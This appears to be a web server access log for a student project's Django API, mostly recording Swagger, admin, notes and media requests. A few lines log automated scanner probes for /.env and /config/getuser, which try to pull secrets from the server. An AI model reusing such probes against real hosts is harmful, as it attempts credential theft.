221.145.194.16 - - [26/Mar/2021:01:16:37 +0000] "GET /static/drf-yasg/url-polyfill.min.js HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:16:37 +0000] "GET /static/drf-yasg/insQ.min.js HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:16:37 +0000] "GET /static/drf-yasg/immutable.min.js HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:16:37 +0000] "GET /static/drf-yasg/swagger-ui-init.js HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:16:37 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 5703 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
23.22.16.221 - - [26/Mar/2021:01:16:38 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 5703 "-" "swagger-validator"
1.245.233.122 - - [26/Mar/2021:01:23:45 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
175.203.106.211 - - [26/Mar/2021:01:28:45 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
175.203.106.211 - - [26/Mar/2021:01:29:51 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
175.203.106.211 - - [26/Mar/2021:01:37:55 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "PostmanRuntime/7.26.10"
221.145.194.16 - - [26/Mar/2021:01:39:29 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:39:30 +0000] "GET /favicon.ico HTTP/1.1" 404 1108 "http://j4b105.p.ssafy.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:39:30 +0000] "GET / HTTP/1.1" 404 1090 "http://59.27.38.15/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.106.211 - - [26/Mar/2021:01:42:10 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
205.185.127.244 - - [26/Mar/2021:01:42:47 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1116 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
175.203.106.211 - - [26/Mar/2021:01:43:24 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "PostmanRuntime/7.26.10"
175.203.106.211 - - [26/Mar/2021:01:44:00 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
175.203.106.211 - - [26/Mar/2021:01:44:23 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
175.203.106.211 - - [26/Mar/2021:01:44:29 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
221.145.194.16 - - [26/Mar/2021:01:44:32 +0000] "GET /admin/ HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:44:32 +0000] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 929 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:44:32 +0000] "GET /static/admin/css/base.css HTTP/1.1" 200 16307 "http://j4b105.p.ssafy.io/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:44:32 +0000] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2138 "http://j4b105.p.ssafy.io/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:44:32 +0000] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18344 "http://j4b105.p.ssafy.io/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:44:32 +0000] "GET /static/admin/css/login.css HTTP/1.1" 200 1185 "http://j4b105.p.ssafy.io/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:44:32 +0000] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 1360 "http://j4b105.p.ssafy.io/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:44:32 +0000] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423 "http://j4b105.p.ssafy.io/static/admin/css/base.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:44:32 +0000] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876 "http://j4b105.p.ssafy.io/static/admin/css/fonts.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:44:32 +0000] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692 "http://j4b105.p.ssafy.io/static/admin/css/fonts.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:44:37 +0000] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 1031 "http://j4b105.p.ssafy.io/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:44:37 +0000] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184 "http://j4b105.p.ssafy.io/static/admin/css/fonts.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:44:39 +0000] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 931 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:01:50:06 +0000] "GET /static/ HTTP/1.1" 403 187 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:01:50:06 +0000] "GET /favicon.ico HTTP/1.1" 404 1108 "http://j4b105.p.ssafy.io/static/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:01:50:11 +0000] "GET /static/test.txt HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
203.159.80.143 - - [26/Mar/2021:02:17:27 +0000] "GET / HTTP/1.1" 404 1090 "-" "Linux Gnu (cow)"
20.199.80.101 - - [26/Mar/2021:02:45:32 +0000] "GET / HTTP/1.1" 404 1088 "-" "python-requests/2.24.0"
172.105.161.142 - - [26/Mar/2021:03:00:56 +0000] "GET / HTTP/1.1" 404 1088 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
89.40.73.221 - - [26/Mar/2021:03:18:09 +0000] "GET / HTTP/1.1" 404 1088 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0"
175.203.81.8 - - [26/Mar/2021:03:57:32 +0000] "GET /media/2021/03/25/fileName_cnXX15G HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:03:57:39 +0000] "GET /media/2021/03/25/rn_image_picker_lib_temp_6003ef9f-7db7-45d0-9d22-ecd07f545446_dJue2CQ.jpg HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
211.176.125.70 - - [26/Mar/2021:04:03:06 +0000] "GET /notes HTTP/1.0" 301 0 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)"
210.66.16.184 - - [26/Mar/2021:04:06:19 +0000] "GET /.env HTTP/1.1" 404 1100 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
210.66.16.184 - - [26/Mar/2021:04:06:19 +0000] "POST / HTTP/1.1" 404 1089 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:04:08:49 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:04:08:49 +0000] "GET /favicon.ico HTTP/1.1" 404 1108 "http://j4b105.p.ssafy.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:04:16:11 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:04:16:12 +0000] "GET / HTTP/1.1" 404 1090 "http://59.27.38.15/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:04:19:44 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:04:19:44 +0000] "GET / HTTP/1.1" 404 1090 "http://59.27.38.15/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
45.83.67.183 - - [26/Mar/2021:04:24:25 +0000] "GET / HTTP/1.1" 404 1088 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
221.145.194.16 - - [26/Mar/2021:05:10:42 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:18:10 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:18:11 +0000] "GET / HTTP/1.1" 404 1090 "http://59.27.38.15/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:24:17 +0000] "GET /robots.txt HTTP/1.1" 404 1105 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:24:17 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:26:23 +0000] "GET /swagger/ HTTP/1.1" 200 895 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:26:23 +0000] "GET /static/drf-yasg/style.css HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:26:23 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui.css HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:26:23 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui-bundle.js HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:26:23 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui-standalone-preset.js HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:26:23 +0000] "GET /static/drf-yasg/insQ.min.js HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:26:23 +0000] "GET /static/drf-yasg/url-polyfill.min.js HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:26:23 +0000] "GET /static/drf-yasg/swagger-ui-init.js HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:26:23 +0000] "GET /static/drf-yasg/immutable.min.js HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:26:24 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 5703 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
23.22.16.221 - - [26/Mar/2021:05:26:25 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 5703 "-" "swagger-validator"
221.145.194.16 - - [26/Mar/2021:05:41:59 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:42:00 +0000] "GET /favicon.ico HTTP/1.1" 404 1108 "http://j4b105.p.ssafy.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:42:00 +0000] "GET / HTTP/1.1" 404 1090 "http://59.27.38.15/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:00 +0000] "GET /ai HTTP/1.1" 404 1101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:15 +0000] "GET /ai/grammercheck HTTP/1.1" 404 1156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:29 +0000] "GET /ai/grammarcheck HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:29 +0000] "GET /ai/grammarcheck/ HTTP/1.1" 401 3797 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:30 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121457 "http://j4b105.p.ssafy.io/ai/grammarcheck/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:30 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 3385 "http://j4b105.p.ssafy.io/ai/grammarcheck/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:30 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 1131 "http://j4b105.p.ssafy.io/ai/grammarcheck/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:30 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817 "http://j4b105.p.ssafy.io/ai/grammarcheck/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:30 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 3597 "http://j4b105.p.ssafy.io/ai/grammarcheck/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:30 +0000] "GET /static/rest_framework/js/jquery-3.5.1.min.js HTTP/1.1" 200 89476 "http://j4b105.p.ssafy.io/ai/grammarcheck/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:30 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 1719 "http://j4b105.p.ssafy.io/ai/grammarcheck/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:30 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 39680 "http://j4b105.p.ssafy.io/ai/grammarcheck/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:30 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632 "http://j4b105.p.ssafy.io/ai/grammarcheck/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:30 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 1268 "http://j4b105.p.ssafy.io/ai/grammarcheck/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:30 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458 "http://j4b105.p.ssafy.io/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:48 +0000] "GET /accounts HTTP/1.1" 404 1103 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:43:54 +0000] "GET /accounts/ HTTP/1.1" 404 1212 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
223.63.187.145 - - [26/Mar/2021:05:43:56 +0000] "POST /accounts/check/email/ HTTP/1.1" 500 130221 "-" "okhttp/3.12.12"
221.145.194.16 - - [26/Mar/2021:05:44:00 +0000] "GET /accounts/signup/ HTTP/1.1" 405 5602 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:05:44:05 +0000] "OPTIONS /accounts/signup/ HTTP/1.1" 200 1843 "http://j4b105.p.ssafy.io/accounts/signup/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
223.63.187.145 - - [26/Mar/2021:05:44:24 +0000] "POST /accounts/check/email/ HTTP/1.1" 500 130221 "-" "okhttp/3.12.12"
223.63.187.145 - - [26/Mar/2021:05:44:32 +0000] "POST /accounts/check/email/ HTTP/1.1" 500 130221 "-" "okhttp/3.12.12"
211.216.240.221 - - [26/Mar/2021:05:45:36 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
150.136.75.66 - - [26/Mar/2021:05:46:09 +0000] "GET /.env HTTP/1.1" 404 1100 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
150.136.75.66 - - [26/Mar/2021:05:46:10 +0000] "POST / HTTP/1.1" 404 1089 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
211.216.240.221 - - [26/Mar/2021:05:47:47 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
175.203.81.8 - - [26/Mar/2021:05:50:58 +0000] "GET /media/2021/03/25/rn_image_picker_lib_temp_6003ef9f-7db7-45d0-9d22-ecd07f545446_dJue2CQ.jpg HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:52:39 +0000] "GET /media/2021/03/25/rn_image_picker_lib_temp_6003ef9f-7db7-45d0-9d22-ecd07f545446_dJue2CQ.jpg HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:05:53:04 +0000] "GET /media/images/2021/03/25/%EB%82%B4_%EC%82%AC%EC%A7%84_Jy4jjh2.jpg HTTP/1.1" 200 37551 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
211.216.240.221 - - [26/Mar/2021:05:54:00 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
54.145.36.55 - - [26/Mar/2021:05:55:00 +0000] "GET / HTTP/1.1" 404 1088 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/56.0.3071.88 Safari/537.32"
211.216.240.221 - - [26/Mar/2021:05:55:40 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
211.216.240.221 - - [26/Mar/2021:05:56:10 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "PostmanRuntime/7.26.10"
175.203.81.8 - - [26/Mar/2021:05:56:29 +0000] "GET /media/images/2021/03/25/%EB%82%B4_%EC%82%AC%EC%A7%84_Jy4jjh2.jpg HTTP/1.1" 200 37551 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
211.216.240.221 - - [26/Mar/2021:05:59:03 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
221.145.194.16 - - [26/Mar/2021:05:59:17 +0000] "GET /media/images/2021/03/25/%EB%82%B4_%EC%82%AC%EC%A7%84_Jy4jjh2.jpg HTTP/1.1" 200 37551 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
211.216.240.221 - - [26/Mar/2021:05:59:27 +0000] "GET /media/images/2021/03/25/%EB%82%B4_%EC%82%AC%EC%A7%84_Jy4jjh2.jpg HTTP/1.1" 200 37551 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
211.216.240.221 - - [26/Mar/2021:05:59:27 +0000] "GET /favicon.ico HTTP/1.1" 404 1108 "http://j4b105.p.ssafy.io/media/images/2021/03/25/%EB%82%B4_%EC%82%AC%EC%A7%84_Jy4jjh2.jpg" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
211.216.240.221 - - [26/Mar/2021:06:00:36 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
